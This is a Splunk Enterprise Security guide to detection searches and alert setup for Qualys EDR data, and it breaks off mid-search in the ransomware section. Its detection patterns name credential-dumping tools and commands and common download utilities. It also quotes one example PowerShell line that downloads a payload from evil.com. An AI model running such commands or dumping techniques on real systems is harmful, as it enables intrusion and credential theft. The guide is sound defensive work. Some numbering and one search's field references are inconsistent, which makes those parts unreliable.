# Splunk ES — Essential SOC Alerts with Security Intelligence
## Qualys EDR | Accelerated Endpoint Data Model | tstats + Threat Intel

---

> **Context:** This guide assumes you have:
> - Splunk Enterprise Security (ES) installed
> - Qualys EDR logs ingested (process, file, network, registry sourcetypes)
> - The **Endpoint** and **Network_Traffic** data models accelerated
> - ES Security Intelligence configured with at least one threat feed
>
> Every search uses `tstats` where the accelerated model applies,
> and Security Intelligence lookups for IOC/reputation checks.

---

## Table of Contents

### SECTION A — Understanding ES Security Intelligence
1. [What Security Intelligence Is and How It Works](#si-overview)
2. [Configuring Threat Intel Sources (Step by Step)](#si-config)
3. [The Intel Lookup Tables — Fields Reference](#si-lookups)

### SECTION B — The Essential SOC Alert Library
**Group 1 — Threat Intelligence Alerts (IOC/Reputation)**
4. [TI-001 — Malicious File Hash Executed](#ti-001)
5. [TI-002 — Communication to Malicious IP](#ti-002)
6. [TI-003 — DNS Query to Malicious Domain](#ti-003)
7. [TI-004 — Malicious URL in Process Command Line](#ti-004)
8. [TI-005 — Combined: Process + Network + IP Reputation](#ti-005)

**Group 2 — Authentication & Identity Alerts**
9. [AUTH-001 — Brute Force / Excessive Failed Logins](#auth-001)
10. [AUTH-002 — Account Lockout Surge](#auth-002)
11. [AUTH-003 — Privileged Account Used from New Location](#auth-003)
12. [AUTH-004 — New Local Admin Account Created](#auth-004)

**Group 3 — Endpoint Execution Alerts**
13. [EXEC-001 — Credential Dumping Tools](#exec-001)
14. [EXEC-002 — Ransomware Kill Chain](#exec-002)
15. [EXEC-003 — Suspicious PowerShell Execution](#exec-003)
16. [EXEC-004 — Living-off-the-Land Binary Abuse](#exec-004)

**Group 4 — Persistence & Defense Evasion Alerts**
17. [PERS-001 — Registry Run Key Persistence](#pers-001)
18. [PERS-002 — Security Tool Disabled (Defender/UAC)](#pers-002)
19. [PERS-003 — Scheduled Task Created by Suspicious Process](#pers-003)

**Group 5 — Lateral Movement & Exfiltration Alerts**
20. [LAT-001 — Lateral Movement to Multiple Internal Hosts](#lat-001)
21. [EXFIL-001 — Large Outbound Data Transfer](#exfil-001)
22. [EXFIL-002 — DNS Tunneling Detection](#exfil-002)

### SECTION C — Operations
23. [Risk Score Summary Alert (RBA Aggregator)](#rba)
24. [Alert Priority Matrix & Scheduling Reference](#matrix)
25. [Common Tuning Patterns](#tuning)

---

# SECTION A — Understanding ES Security Intelligence

---

## 1. What Security Intelligence Is and How It Works <a name="si-overview"></a>

### The Core Concept

Splunk ES Security Intelligence is a threat intelligence framework built into ES.
It does two things:

**1. Ingests threat feeds** — Lists of known-malicious IPs, domains, file hashes,
and URLs from commercial feeds, OSINT sources, and your own custom lists.

**2. Makes those lists available as lookup tables** — So your correlation searches
can check any observed value (IP address, domain, hash) against them in real time.

Think of it as giving your correlation searches access to a continuously updated
database of "known bad" indicators, so instead of hardcoding `dest_ip != "185.220.101.5"`,
your search automatically knows that IP is a Tor exit node and flags it.

### How the Data Flows

```
External Threat Feeds          Splunk ES                    Your Searches
(STIX/TAXII, CSV, API)  →   Threat Intel Manager   →   Intel Lookup Tables
                               (normalizes & stores)      ip_intel
                                                          domain_intel
                                                          file_intel
                                                          url_intel
                                                          email_intel
                                                               │
                               Qualys EDR Logs  ─────────────►│◄─── lookup
                               (your telemetry)            Match? → Alert
```

### The Six Intel Lookup Tables

ES Security Intelligence populates and maintains these KV store collections automatically:

| Lookup Table | What it matches against | Primary key field |
|---|---|---|
| `ip_intel` | IP addresses (C2 servers, Tor exits, malware hosts) | `ip` |
| `domain_intel` | Domain names (phishing, malware C2, DGA) | `domain` |
| `file_intel` | File hashes MD5/SHA256 (malware samples) | `file_hash` |
| `url_intel` | Full URLs (malicious download links, phishing pages) | `url` |
| `email_intel` | Email addresses (phishing senders, compromised accounts) | `email` |
| `certificate_intel` | TLS certificate fingerprints (malware infrastructure) | `certificate` |

Each lookup table contains these key output fields:

| Field | Description | Example |
|---|---|---|
| `threat_key` | Category of the threat | `malware`, `botnet`, `c2`, `tor`, `scanner` |
| `description` | Human-readable explanation | `"Known Cobalt Strike C2 server"` |
| `weight` | Confidence score (0–100) | `90` |
| `source` | Which feed flagged it | `ETPRO`, `abuse.ch`, `custom_ioc_list` |
| `ip_rep` | For IP: reputation score | `-100` to `+100` |
| `dns_threat_category` | For domains: threat type | `phishing`, `malware`, `botnet` |

---

## 2. Configuring Threat Intel Sources (Step by Step) <a name="si-config"></a>

Before your intel-based searches work, you need at least one threat feed configured.
Here is how to add sources in Splunk ES.

### Step 1 — Open Threat Intelligence Manager

1. Log into Splunk ES.
2. Top menu → **Security Intelligence**.
3. In the submenu → **Threat Intelligence** → **Threat Intelligence Manager**.
4. You see a list of existing intel sources (ES ships with a few defaults).

### Step 2 — Add a STIX/TAXII Feed (Recommended — Free/Commercial)

TAXII is the standard protocol for distributing threat intel in STIX format.

1. In Threat Intelligence Manager → Click **New** → Select **TAXII Feed**.
2. Fill in:

| Field | Value |
|---|---|
| **Name** | `ETPRO_TAXII` (or your feed name) |
| **URL** | Your TAXII server URL (provided by vendor) |
| **Collection** | Collection name from your vendor |
| **Credentials** | Username/password or API key |
| **Polling Interval** | `3600` (1 hour — adjust per feed) |

> **Free TAXII sources to start with:**
> - **CIRCL.lu** (`https://www.circl.lu/doc/misp/feed-osint/`) — OSINT malware
> - **Abuse.ch** (`https://bazaar.abuse.ch`) — MalwareBazaar hashes
> - **AlienVault OTX** — requires free account

3. Click **Save**. ES will immediately pull the feed and populate the intel tables.

### Step 3 — Add a CSV Lookup (For Custom IOC Lists)

For your own IOC lists (from incident response, vendor advisories, internal threat intel):

1. In Threat Intelligence Manager → **New** → **CSV File**.
2. **Name:** `custom_ioc_list`
3. **Category:** `ip` (or `domain`, `file`, `url`)
4. Upload your CSV. It must contain at minimum:
   - For IPs: `ip,description,threat_key`
   - For domains: `domain,description,threat_key`
   - For hashes: `file_hash,description,threat_key`
5. **Parsing Options:** Map your CSV columns to the required fields.
6. **Update Interval:** `86400` (daily) if you update the file regularly.
7. Save.

### Step 4 — Verify Intel is Populated

Run this search to confirm your intel tables have data:

```spl
| inputlookup ip_intel
| head 20
| table ip threat_key description weight source
```

And for domains:

```spl
| inputlookup domain_intel
| head 20
| table domain threat_key description dns_threat_category
```

If you see rows, your feeds are working. If empty, recheck the feed configuration
and look at the Threat Intelligence audit log:

```spl
index=_internal sourcetype=splunkd component=ThreatIntelligence
| tail 50
```

### Step 5 — Set Retention Policy

1. In Threat Intelligence Manager → **Settings** (gear icon).
2. Set **Maximum Age** for each intel type (recommended: `90` days).
3. Set **Maximum Size** to prevent KV store bloat.

### Step 6 — The Threat Activity Audit Dashboard

ES has a built-in dashboard showing all threat intel matches across your environment:

**ES Menu → Security Intelligence → Threat Activity → Threat Activity Audit**

This gives you an overview before you even build custom searches.

---

## 3. The Intel Lookup Tables — Fields Reference <a name="si-lookups"></a>

### How to use in a Correlation Search

The standard pattern for any intel lookup in your searches:

```spl
| lookup local=true ip_intel ip AS <your_field> OUTPUT threat_key description weight source
| where isnotnull(threat_key)
```

Breaking this down:
- `local=true` — Forces the lookup to run on the search head (faster for KV store)
- `ip_intel` — The lookup table name
- `ip AS dest_ip` — Maps YOUR field (`dest_ip`) to the lookup key (`ip`)
- `OUTPUT threat_key description weight source` — Fields to bring back
- `| where isnotnull(threat_key)` — Only keep rows where a match was found

### All Six Lookup Patterns

```spl
| lookup local=true ip_intel          ip           AS dest_ip            OUTPUT threat_key description weight source
| lookup local=true domain_intel      domain       AS dns_query          OUTPUT threat_key description dns_threat_category
| lookup local=true file_intel        file_hash    AS process_hash_sha256 OUTPUT threat_key description
| lookup local=true file_intel        file_hash    AS file_hash_sha256    OUTPUT threat_key description
| lookup local=true url_intel         url          AS url                 OUTPUT threat_key description
| lookup local=true email_intel       email        AS sender              OUTPUT threat_key description
| lookup local=true certificate_intel certificate  AS ssl_hash            OUTPUT threat_key description
```

### Reputation Score Thresholds (for ip_intel)

The `ip_rep` field in `ip_intel` ranges from -100 (most malicious) to +100 (most trusted):

| ip_rep Range | Meaning | Action |
|---|---|---|
| -100 to -75 | Known malicious (C2, botnet, malware) | Critical alert |
| -74 to -50 | Suspicious (scanner, Tor, proxy abuse) | High alert |
| -49 to -25 | Poor reputation (hosting abuse history) | Medium alert |
| -24 to 0 | Unknown/neutral | Informational |
| 1 to 100 | Good reputation | No alert needed |

---

# SECTION B — The Essential SOC Alert Library

---

# GROUP 1 — THREAT INTELLIGENCE ALERTS

---

## TI-001 — Malicious File Hash Executed <a name="ti-001"></a>

**Why this is a top SOC priority:**
This is the highest-confidence detection available. If a file hash in your EDR process
logs matches a hash in your threat intel feeds, you have confirmed malware execution.
There are almost no false positives — a hash is binary: either it's malicious or it isn't.
Every SOC should have this as their #1 alert.

**Security Intelligence feature used:** `file_intel` lookup

**Data model used:** `Endpoint.Processes` (accelerated)

**MITRE ATT&CK:** T1204 — User Execution

**Search Query:**

```spl
| tstats summariesonly=true
    values(Processes.process_hash_sha256) as sha256_list
    values(Processes.process_hash_md5) as md5_list
    values(Processes.process) as process_names
    values(Processes.process_path) as process_paths
    values(Processes.command_line) as command_lines
    min(_time) as firstTime
    max(_time) as lastTime
    count
    FROM datamodel=Endpoint.Processes
    BY Processes.dest Processes.user

| rename Processes.* AS *

| mvexpand sha256_list
| rename sha256_list AS file_hash

| lookup local=true file_intel file_hash AS file_hash
    OUTPUT threat_key description weight source

| where isnotnull(threat_key)

| stats
    values(file_hash) as matched_hashes
    values(process_names) as processes
    values(process_paths) as paths
    values(command_lines) as commands
    values(threat_key) as threat_categories
    values(description) as threat_descriptions
    values(source) as intel_sources
    max(weight) as max_confidence
    min(firstTime) as firstTime
    max(lastTime) as lastTime
    sum(count) as total_executions
    by dest user

| eval severity="critical"
| eval mitre_technique="T1204"
| eval alert_reason="Confirmed malware hash match in threat intelligence. Malware executed on endpoint."
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation in Splunk ES:**

1. ES → Configure → Content Management → Create New Content → Correlation Search
2. **Name:** `TI-001 - Malicious File Hash Executed (Threat Intel Match)`
3. **Description:**
   `Detects execution of a process whose SHA256 hash matches an entry in the ES Security Intelligence file_intel lookup table. This is a confirmed malware execution event — very high confidence, near-zero false positive rate. Investigate immediately and isolate the endpoint.`
4. Paste the search above into the Search box.
5. **Schedule:** Cron `*/5 * * * *` | Earliest `-6m` | Latest `-1m`
6. **Throttle:** Field = `dest` | Window = `300` seconds
7. **Trigger:** For each result
8. Click **Adaptive Response Actions** tab → Add → **Notable Event:**
   - **Title:** `CONFIRMED MALWARE: $matched_hashes$ executed on $dest$ by $user$`
   - **Security Domain:** `Endpoint`
   - **Severity:** `Critical`
   - **Description:** `$threat_descriptions$ | Source: $intel_sources$ | Confidence: $max_confidence$%`
   - **Drill-down Name:** `Show all events from $dest$ in last 2 hours`
   - **Drill-down Search:**
     ```spl
     index=edr dest="$dest$" earliest=-2h
     | table _time sourcetype user process process_path command_line file_hash action
     | sort _time
     ```
9. Add second Adaptive Response Action → **Risk Analysis:**
   - **Risk Object:** `dest` | **Risk Score:** `80`
   - **Threat Object:** `user` | **Risk Score:** `50`
10. Save and Enable.

**What to do when this fires:**
- Check `max_confidence` — above 80 means very high certainty
- Check `intel_sources` — which feed flagged it
- Immediately run the drill-down search
- If confirmed: isolate host via Qualys EDR console, open incident

---

## TI-002 — Communication to Malicious IP <a name="ti-002"></a>

**Why this is a top SOC priority:**
Network connections to known malicious IPs indicate active C2 communication, data
exfiltration, or malware downloading payloads. Unlike process-based detections which
might be evaded, network connections are hard to hide — the machine must communicate.
Using `ip_intel` with the reputation score allows you to grade the severity automatically.

**Security Intelligence features used:** `ip_intel` lookup with `ip_rep` score

**Data model used:** `Network_Traffic` (accelerated)

**MITRE ATT&CK:** T1071 — Application Layer Protocol

**Search Query:**

```spl
| tstats summariesonly=true
    count as connection_count
    sum(Network_Traffic.bytes_out) as bytes_out
    sum(Network_Traffic.bytes_in) as bytes_in
    values(Network_Traffic.dest_port) as dest_ports
    values(Network_Traffic.transport) as protocols
    min(_time) as firstTime
    max(_time) as lastTime
    FROM datamodel=Network_Traffic
    WHERE Network_Traffic.action != "blocked"
    BY Network_Traffic.src_ip Network_Traffic.dest_ip Network_Traffic.dest

| rename Network_Traffic.* AS *

| lookup local=true ip_intel ip AS dest_ip
    OUTPUT threat_key description weight source ip_rep

| where isnotnull(threat_key)

| eval bytes_out_mb = round(bytes_out/1024/1024, 2)
| eval bytes_in_mb  = round(bytes_in/1024/1024,  2)

| eval severity=case(
    ip_rep <= -75 OR threat_key IN ("malware","c2","botnet","ransomware"), "critical",
    ip_rep <= -50 OR threat_key IN ("tor","phishing","exploit"), "high",
    ip_rep <= -25, "medium",
    1==1, "low"
  )

| eval mitre_technique="T1071"
| eval alert_reason="Outbound connection to IP with known-malicious reputation in threat intel feed."
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. ES → Configure → Content Management → Create New Content → Correlation Search
2. **Name:** `TI-002 - Communication to Malicious IP (Threat Intel)`
3. **Description:**
   `Detects outbound or inbound connections to IP addresses with negative reputation scores or known-malicious threat categories in the ES ip_intel lookup. Severity is automatically set based on the ip_rep score and threat_key category.`
4. Paste the search above.
5. **Schedule:** `*/5 * * * *` | Earliest `-6m` | Latest `-1m`
6. **Throttle:** Field = `src_ip,dest_ip` | Window = `1800` seconds
7. **Trigger:** For each result
8. **Notable Event (Adaptive Response):**
   - **Title:** `$severity$ - Connection to Malicious IP $dest_ip$ from $dest$ | Category: $threat_key$`
   - **Security Domain:** `Network`
   - **Severity:** `$severity$`
   - **Description:**
     `$description$ | Rep Score: $ip_rep$ | Feed: $source$ | Bytes Out: $bytes_out_mb$ MB | Connections: $connection_count$`
   - **Drill-down Search:**
     ```spl
     | tstats summariesonly=true count
         values(Network_Traffic.dest_port) as ports
         values(Network_Traffic.bytes_out) as bytes
         min(_time) as firstTime max(_time) as lastTime
         FROM datamodel=Network_Traffic
         WHERE Network_Traffic.dest_ip="$dest_ip$" Network_Traffic.dest="$dest$"
         BY Network_Traffic.src_ip Network_Traffic.dest_ip
     ```
9. Add **Risk Analysis** response:
   - Risk Object: `dest` | Score: `60`
   - Threat Object: `dest_ip` | Score: `0` (external — no internal risk)
10. Save and Enable.

---

## TI-003 — DNS Query to Malicious Domain <a name="ti-003"></a>

**Why this is a top SOC priority:**
DNS is the first step in almost every C2 communication. Before a machine connects to
a malicious IP, it resolves the domain name. Catching the DNS query gives you earlier
detection than catching the connection itself — and helps you identify DGA (domain
generation algorithm) domains used by sophisticated malware.

**Security Intelligence features used:** `domain_intel` lookup with `dns_threat_category`

**Data model used:** `Network_Resolution` (DNS data from network sourcetype)

**Note:** If your DNS data is in `qualys:edr:network` with a `dns_query` field, use this
hybrid approach since DNS may not be in a fully accelerated model:

```spl
| tstats summariesonly=true
    count as query_count
    dc(Processes.dest) as unique_hosts
    min(_time) as firstTime
    max(_time) as lastTime
    FROM datamodel=Network_Traffic
    WHERE Network_Traffic.dest_port=53
    BY Network_Traffic.dest Network_Traffic.query

| rename Network_Traffic.* AS *

| lookup local=true domain_intel domain AS query
    OUTPUT threat_key description dns_threat_category weight source

| where isnotnull(threat_key)

| eval severity=case(
    dns_threat_category IN ("malware","c2","ransomware","exploit_kit"),  "critical",
    dns_threat_category IN ("phishing","botnet","trojan"),               "high",
    dns_threat_category IN ("adware","pup","tor","proxy"),               "medium",
    1==1, "low"
  )

| eval mitre_technique="T1071.004"
| eval alert_reason="DNS resolution attempt for a domain flagged in threat intelligence."
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**If your DNS data comes directly from qualys:edr:network (hybrid approach):**

```spl
index=edr sourcetype="qualys:edr:network"
  dns_query=*

| eval domain=lower(dns_query)
| where len(domain) > 3

| lookup local=true domain_intel domain AS domain
    OUTPUT threat_key description dns_threat_category weight source

| where isnotnull(threat_key)

| stats
    count as query_count
    min(_time) as firstTime
    max(_time) as lastTime
    values(threat_key) as threat_categories
    values(description) as descriptions
    values(dns_threat_category) as threat_types
    values(source) as intel_sources
    max(weight) as confidence
    by dest domain

| eval severity=case(
    dns_threat_category IN ("malware","c2","ransomware"),  "critical",
    dns_threat_category IN ("phishing","botnet"),          "high",
    1==1, "medium"
  )

| eval mitre_technique="T1071.004"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `TI-003 - DNS Query to Malicious Domain (Threat Intel)`
2. **Description:**
   `Detects DNS queries from endpoints to domains listed in the ES domain_intel threat intelligence table. DNS-level detection provides earlier warning than IP-based detection since DNS resolution precedes the connection. Covers C2 domains, phishing sites, and malware distribution domains.`
3. Paste the appropriate search.
4. **Schedule:** `*/5 * * * *` | Earliest `-6m` | Latest `-1m`
5. **Throttle:** Field = `dest,domain` | Window = `3600` seconds
6. **Notable Event:**
   - **Title:** `TI-003: DNS to Malicious Domain $domain$ from $dest$ | Type: $threat_types$`
   - **Security Domain:** `Network`
   - **Severity:** `$severity$`
   - **Description:** `$descriptions$ | Confidence: $confidence$% | Feed: $intel_sources$`
7. Save and Enable.

---

## TI-004 — Malicious URL in Process Command Line <a name="ti-004"></a>

**Why this is a top SOC priority:**
Attackers often embed download URLs directly in process command lines (e.g., PowerShell
downloading a payload: `Invoke-WebRequest -Uri http://evil.com/payload.exe`). Matching
those URLs against `url_intel` catches malware delivery in progress — before the file
is even written to disk.

**Security Intelligence feature used:** `url_intel` lookup

**Data model used:** `Endpoint.Processes` (accelerated) + regex URL extraction

```spl
| tstats summariesonly=true
    values(Processes.command_line) as command_lines
    values(Processes.process) as processes
    min(_time) as firstTime
    max(_time) as lastTime
    count
    FROM datamodel=Endpoint.Processes
    WHERE (Processes.process="*powershell*"
        OR Processes.process="*cmd*"
        OR Processes.process="*certutil*"
        OR Processes.process="*bitsadmin*"
        OR Processes.process="*curl*"
        OR Processes.process="*wget*"
        OR Processes.process="*mshta*")
    BY Processes.dest Processes.user Processes.process

| rename Processes.* AS *

| mvexpand command_lines

| rex field=command_lines "(?i)(https?://[^\s\"\'\)\]]+)" max_match=5

| where isnotnull(match_1)

| eval extracted_url=mvappend(match_1, match_2, match_3, match_4, match_5)
| mvexpand extracted_url
| where isnotnull(extracted_url)

| eval extracted_url=lower(extracted_url)

| lookup local=true url_intel url AS extracted_url
    OUTPUT threat_key description weight source

| where isnotnull(threat_key)

| stats
    values(extracted_url) as malicious_urls
    values(processes) as processes
    values(command_lines) as commands
    values(threat_key) as threat_types
    values(description) as descriptions
    max(weight) as confidence
    min(firstTime) as firstTime
    max(lastTime) as lastTime
    by dest user

| eval severity="critical"
| eval mitre_technique="T1105"
| eval alert_reason="Process command line contains a URL flagged as malicious in threat intel."
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `TI-004 - Malicious URL in Process Command Line (Threat Intel)`
2. **Description:**
   `Extracts URLs from process command line arguments and matches them against the ES url_intel lookup table. Detects processes actively downloading malware from known-malicious URLs. Covers PowerShell Invoke-WebRequest, certutil -urlcache, bitsadmin, curl, and wget.`
3. **Schedule:** `*/15 * * * *` | Earliest `-20m` | Latest `-5m`
4. **Throttle:** Field = `dest,user` | Window = `1800` seconds
5. **Notable Event:**
   - **Title:** `CRITICAL: Malicious URL Download Attempt on $dest$ by $user$`
   - **Severity:** `Critical`
   - **Description:** `URLs: $malicious_urls$ | Threat: $threat_types$ | $descriptions$`
6. Save and Enable.

---

## TI-005 — Process + Network + IP Reputation (Combined Kill Chain) <a name="ti-005"></a>

**Why this is a top SOC priority:**
This is a premium detection that chains THREE sources: a suspicious process execution
followed by a network connection to a low-reputation IP from the same host. Individually
these might be medium alerts. Together, they form a confirmed attack pattern.

**Security Intelligence feature used:** `ip_intel` reputation check

**Approach:** Hybrid tstats → regular SPL join → intel lookup

```spl
| tstats summariesonly=true
    values(Processes.process) as suspicious_processes
    values(Processes.command_line) as commands
    min(_time) as proc_time
    FROM datamodel=Endpoint.Processes
    WHERE (Processes.process="*powershell*"
        OR Processes.process="*wscript*"
        OR Processes.process="*cscript*"
        OR Processes.process="*mshta*"
        OR Processes.process="*cmd*")
    BY Processes.dest Processes.user

| rename Processes.* AS *

| appendcols [
    | tstats summariesonly=true
          count as net_count
          sum(Network_Traffic.bytes_out) as bytes_out
          values(Network_Traffic.dest_ip) as dest_ips
          values(Network_Traffic.dest_port) as dest_ports
          min(_time) as net_time
          FROM datamodel=Network_Traffic
          WHERE Network_Traffic.action != "blocked"
          BY Network_Traffic.dest
      | rename Network_Traffic.dest AS dest
  ]

| where isnotnull(proc_time) AND isnotnull(net_time)
  AND net_time >= proc_time
  AND (net_time - proc_time) <= 600

| mvexpand dest_ips
| rename dest_ips AS dest_ip

| where NOT match(dest_ip, "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)")

| lookup local=true ip_intel ip AS dest_ip
    OUTPUT threat_key description weight source ip_rep

| where isnotnull(threat_key) OR ip_rep <= -50

| eval severity=case(
    ip_rep <= -75 OR threat_key IN ("c2","malware","botnet"), "critical",
    ip_rep <= -50 OR threat_key IN ("phishing","tor"),        "high",
    1==1, "medium"
  )

| stats
    values(suspicious_processes) as processes
    values(dest_ip) as c2_candidates
    values(threat_key) as threat_types
    values(description) as threat_desc
    max(weight) as confidence
    sum(bytes_out) as total_bytes_out
    min(proc_time) as firstTime
    max(net_time) as lastTime
    by dest user severity

| eval bytes_out_mb=round(total_bytes_out/1024/1024, 2)
| eval mitre_technique="T1059,T1071"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `TI-005 - Suspicious Process Followed by C2 Connection (Combined Intel)`
2. **Description:**
   `Combines two signals: (1) a suspicious scripting/shell process runs on an endpoint, (2) within 10 minutes the same host makes a network connection to an IP with negative reputation. This multi-stage correlation is a very high-confidence C2 communication indicator.`
3. **Schedule:** `*/15 * * * *` | Earliest `-20m` | Latest `-5m`
4. **Throttle:** Field = `dest` | Window = `1800` seconds
5. **Notable Event:**
   - **Title:** `$severity$ - Process + C2 Connection Confirmed on $dest$ by $user$`
   - **Severity:** `$severity$`
   - **Description:** `Processes: $processes$ | C2 IPs: $c2_candidates$ | Threat: $threat_types$ | Data Out: $bytes_out_mb$ MB`
6. Save and Enable.

---

# GROUP 2 — AUTHENTICATION & IDENTITY ALERTS

---

## AUTH-001 — Brute Force / Excessive Failed Logins <a name="auth-001"></a>

**Why this is a top SOC priority:**
Brute force and password spraying attacks target authentication systems. Seeing many
failed logins in a short window is the classic indicator. Password spraying (many accounts,
few attempts each) is harder to catch with per-account thresholds — this search catches both.

> **Note:** This requires Windows Security Event Log (Event ID 4625) or similar auth logs
> in Splunk, mapped to the `Authentication` data model. Qualys EDR process logs alone are
> insufficient for auth monitoring — confirm your auth logs are ingested.

```spl
| tstats summariesonly=true
    count as failure_count
    dc(Authentication.user) as unique_accounts_targeted
    dc(Authentication.src) as unique_sources
    values(Authentication.user) as targeted_accounts
    values(Authentication.src) as source_ips
    values(Authentication.app) as applications
    min(_time) as firstTime
    max(_time) as lastTime
    FROM datamodel=Authentication
    WHERE Authentication.action="failure"
    BY Authentication.dest Authentication.src _time

| bin _time span=15m

| stats
    sum(failure_count) as total_failures
    max(unique_accounts_targeted) as unique_accounts
    max(unique_sources) as unique_src
    values(targeted_accounts) as accounts
    values(source_ips) as sources
    values(applications) as apps
    min(firstTime) as firstTime
    max(lastTime) as lastTime
    by Authentication.dest _time

| rename Authentication.dest AS dest

| eval attack_type=case(
    unique_accounts >= 10 AND total_failures >= 20,  "Password Spray (many accounts)",
    unique_accounts <= 3  AND total_failures >= 20,  "Brute Force (targeted accounts)",
    total_failures >= 50,                            "High-Volume Auth Attack",
    1==1, "Excessive Failed Logins"
  )

| where total_failures >= 20

| eval severity=case(
    total_failures >= 200 OR unique_accounts >= 50, "critical",
    total_failures >= 50  OR unique_accounts >= 10, "high",
    1==1, "medium"
  )

| lookup local=true ip_intel ip AS sources
    OUTPUT threat_key AS src_threat_key description AS src_description

| eval intel_flag=if(isnotnull(src_threat_key), "⚠ Source IP in Threat Intel: " + src_threat_key, "Source not in threat intel")

| eval mitre_technique="T1110"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

> **Note the Security Intelligence addition:** We also check if the **source IP** is in
> `ip_intel`. A brute force from a known malicious IP immediately upgrades this from
> opportunistic to targeted attack.

**Step-by-step creation:**

1. **Name:** `AUTH-001 - Brute Force / Password Spray Attack`
2. **Description:**
   `Detects 20 or more authentication failures in a 15-minute window. Automatically distinguishes between brute force (targeting few accounts) and password spray (targeting many accounts). Also cross-references the source IP against threat intel.`
3. **Schedule:** `*/15 * * * *` | Earliest `-20m` | Latest `-5m`
4. **Throttle:** Field = `dest` | Window = `900` seconds
5. **Notable Event:**
   - **Title:** `AUTH-001: $attack_type$ on $dest$ - $total_failures$ failures against $unique_accounts$ accounts`
   - **Security Domain:** `Identity`
   - **Severity:** `$severity$`
   - **Description:** `$intel_flag$ | Sources: $sources$ | Target Accounts: $accounts$`
6. Save and Enable.

---

## AUTH-002 — New Local Admin Account Created <a name="auth-002"></a>

**Why this is a top SOC priority:**
Creating a new local administrator account is a classic persistence technique.
After gaining access, attackers create a backdoor admin account to ensure continued
access even if their malware is removed. This should almost never happen outside of
a formal change management process.

```spl
| tstats summariesonly=true
    values(Processes.command_line) as commands
    values(Processes.process) as processes
    min(_time) as firstTime
    max(_time) as lastTime
    count
    FROM datamodel=Endpoint.Processes
    WHERE (Processes.command_line="*net user*" OR Processes.command_line="*New-LocalUser*")
      AND (Processes.command_line="*/add*" OR Processes.command_line="*-Group Administrators*"
           OR Processes.command_line="*net localgroup*administrators*")
    BY Processes.dest Processes.user

| rename Processes.* AS *

| where NOT match(lower(user), "(svc_|service|system|provisioning|deploy)")

| eval severity="high"
| eval mitre_technique="T1136.001"
| eval alert_reason="A new local user account was created or added to Administrators group via command line."
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `AUTH-002 - New Local Admin Account Created`
2. **Description:**
   `Detects net user /add and net localgroup administrators commands, or PowerShell New-LocalUser. Creating local admin accounts is a classic attacker persistence technique. Excludes known provisioning and service accounts.`
3. **Schedule:** `*/15 * * * *` | Earliest `-20m` | Latest `-5m`
4. **Throttle:** Field = `dest` | Window = `3600` seconds
5. **Notable Event:**
   - **Title:** `AUTH-002: New Admin Account Creation on $dest$ by $user$`
   - **Security Domain:** `Identity`
   - **Severity:** `High`
   - **Description:** `Commands run: $commands$`
6. Save and Enable.

---

# GROUP 3 — ENDPOINT EXECUTION ALERTS

---

## EXEC-001 — Credential Dumping Tools <a name="exec-001"></a>

**Why this is a top SOC priority:**
Credential theft is the #1 enabler of lateral movement. Once an attacker has valid
credentials, they can move freely through your network using legitimate protocols.
Mimikatz and similar tools are the primary instruments for this.

**Security Intelligence addition:** After detecting the tool, we also check if the
process hash is in `file_intel` to immediately confirm if it's a known malware sample.

```spl
| tstats summariesonly=true
    values(Processes.command_line) as command_lines
    values(Processes.process_hash_sha256) as sha256_hashes
    values(Processes.process_path) as process_paths
    min(_time) as firstTime
    max(_time) as lastTime
    count
    FROM datamodel=Endpoint.Processes
    WHERE (Processes.process="*mimikatz*"
        OR Processes.process="*mimilib*"
        OR Processes.process="*procdump*"
        OR Processes.process="*ntdsutil*"
        OR Processes.process="*gsecdump*"
        OR Processes.process="*wce*"
        OR Processes.command_line="*sekurlsa*"
        OR Processes.command_line="*lsadump*"
        OR Processes.command_line="*lsass*dump*"
        OR Processes.command_line="*kerberos::*")
    BY Processes.dest Processes.user Processes.process

| rename Processes.* AS *

| mvexpand sha256_hashes
| rename sha256_hashes AS file_hash

| lookup local=true file_intel file_hash AS file_hash
    OUTPUT threat_key AS hash_threat_key description AS hash_description

| stats
    values(process) as processes
    values(command_lines) as commands
    values(process_paths) as paths
    values(file_hash) as hashes
    values(hash_threat_key) as intel_matches
    values(hash_description) as intel_descriptions
    min(firstTime) as firstTime
    max(lastTime) as lastTime
    sum(count) as total_events
    by dest user

| eval intel_confirmed=if(isnotnull(mvindex(intel_matches,0)), "YES - Hash in threat intel", "Behaviorally detected - hash not in intel")
| eval severity="critical"
| eval mitre_technique="T1003"
| convert timeformat="%Y-%m-%dT%H:%M:%S" ctime(firstTime) ctime(lastTime)
```

**Step-by-step creation:**

1. **Name:** `EXEC-001 - Credential Dumping Tool Execution`
2. **Description:**
   `Detects Mimikatz, ProcDump targeting LSASS, ntdsutil (AD credential dump), and similar tools by process name and command-line patterns. Additionally cross-references the process hash against file_intel to confirm if it's a known malware sample.`
3. **Schedule:** `*/5 * * * *` | Earliest `-6m` | Latest `-1m`
4. **Throttle:** Field = `dest` | Window = `600` seconds
5. **Notable Event:**
   - **Title:** `CRITICAL: Credential Dumping on $dest$ by $user$ | Intel Match: $intel_confirmed$`
   - **Security Domain:** `Endpoint`
   - **Severity:** `Critical`
6. Save and Enable.

---

## EXEC-002 — Ransomware Kill Chain <a name="exec-002"></a>

**Why this is a top SOC priority:**
Ransomware causes catastrophic business disruption. Detecting it during the kill chain
(before all files are encrypted) can limit damage. The combination of shadow copy deletion
+ file encryption + registry changes is near-100% confidence ransomware.

**Security Intelligence addition:** Cross-references both process hashes and destination
IPs of any network calls against threat intel.

```spl
index=edr

| eval is_shadow_kill=if(
    sourcetype="qualys:edr:process"
    AND match(lower(command_line),
